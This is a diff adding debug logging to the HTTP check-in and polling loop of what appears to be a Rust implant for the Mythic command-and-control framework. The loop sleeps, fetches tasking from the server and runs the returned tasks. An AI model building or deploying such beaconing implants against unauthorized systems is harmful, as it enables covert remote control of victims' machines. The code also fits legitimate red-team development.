@@ -386,13 +386,18 @@ impl Profile for HttpProfile {
             }
         };
 
+        utils::print_debug(&format!("HTTP: Checkin response - status: {:?}, id: {:?}, action: {:?}",
+            checkin_response.status, checkin_response.id, checkin_response.action));
+
         if let Some(status) = &checkin_response.status {
             utils::print_debug(&format!("HTTP: Checkin status: {}", status));
             if status != "success" {
-                utils::print_debug("HTTP: Checkin status not success, exiting");
+                utils::print_debug(&format!("HTTP: Checkin status not success (got: {}), exiting", status));
                 self.running.store(false, Ordering::Relaxed);
                 return;
             }
+        } else {
+            utils::print_debug("HTTP: WARNING - No status in checkin response, continuing anyway");
         }
 
         // Update Mythic ID and sync encryption keys
@@ -413,41 +418,62 @@ impl Profile for HttpProfile {
             }
         } else {
             utils::print_debug("HTTP: WARNING - No callback ID in checkin response");
+            // This might be why it's stuck in "submitted" - Mythic hasn't assigned an ID yet
+            // We should probably retry or handle this case
         }
 
         utils::print_debug("HTTP: Entering main polling loop");
 
         // Main polling loop
+        let mut loop_count = 0;
         while !self.should_stop.load(Ordering::Relaxed) && !self.past_killdate() {
+            loop_count += 1;
+            utils::print_debug(&format!("HTTP: Polling loop iteration {}", loop_count));
+
             // Sleep
             let sleep_time = self.get_sleep_time();
             if sleep_time > 0 {
+                utils::print_debug(&format!("HTTP: Sleeping for {} seconds", sleep_time));
                 tokio::time::sleep(Duration::from_secs(sleep_time as u64)).await;
+                utils::print_debug("HTTP: Sleep completed");
             }
 
             if self.should_stop.load(Ordering::Relaxed) {
+                utils::print_debug("HTTP: should_stop is true, breaking loop");
                 break;
             }
 
             // Build get_tasking message, including any buffered responses
+            utils::print_debug("HTTP: Building get_tasking message");
             let msg = crate::responses::drain_poll_buffer();
             let msg_json = match serde_json::to_vec(&msg) {
                 Ok(j) => j,
-                Err(_) => {
+                Err(e) => {
+                    utils::print_debug(&format!("HTTP: Failed to serialize message: {:?}", e));
                     continue;
                 }
             };
+
             // Send and process response
+            utils::print_debug("HTTP: Sending get_tasking request");
             if let Some(response_bytes) = self.send_message(&msg_json).await {
+                utils::print_debug(&format!("HTTP: Received response ({} bytes)", response_bytes.len()));
                 match serde_json::from_slice::<crate::structs::MythicMessageResponse>(&response_bytes)
                 {
                     Ok(mythic_response) => {
+                        utils::print_debug(&format!("HTTP: Parsed response, {} tasks", mythic_response.tasks.len()));
                         tasks::handle_message_from_mythic(mythic_response).await;
                     }
-                    Err(_) => {}
+                    Err(e) => {
+                        utils::print_debug(&format!("HTTP: Failed to parse response: {:?}", e));
+                    }
                 }
+            } else {
+                utils::print_debug("HTTP: send_message returned None");
             }
         }
+
+        utils::print_debug(&format!("HTTP: Exited polling loop after {} iterations", loop_count));
 
         self.running.store(false, Ordering::Relaxed);
         utils::print_debug("HTTP: Profile stopped");
